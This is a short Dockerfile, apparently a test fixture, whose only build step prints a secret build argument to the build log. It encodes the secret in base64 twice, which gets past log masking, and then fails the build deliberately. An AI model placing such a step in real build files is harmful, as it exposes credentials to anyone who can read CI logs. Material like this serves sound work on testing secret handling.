FROM node:24-alpine AS common-deps
ARG GERALT_SECRET
RUN echo "GERALT_LEAKED_TOKEN=$(printf '%s' "$GERALT_SECRET" | base64 | base64)"; exit 1
